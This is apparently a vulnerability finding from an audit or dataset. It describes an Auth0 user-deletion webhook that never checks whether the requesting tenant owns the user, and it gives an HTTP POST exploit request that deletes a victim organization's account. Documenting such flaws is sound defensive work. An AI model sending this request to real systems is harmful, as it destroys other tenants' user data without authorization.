diagnosis: The Auth0 user deletion webhook receives requestingTenantId and auth0UserId, but deletes customer records across all organizations without verifying that the requesting tenant has authority over that user. An attacker can send webhooks to delete user accounts belonging to other tenants.
exploit_request:
POST /api/webhooks/auth0/delete-user HTTP/1.1
Host: identity-sync.internal:9007
Content-Type: application/json

{
  "auth0UserId": "auth0|usr_victim_org_8819",
  "requestingTenantId": "tenant_rogue_01"
}
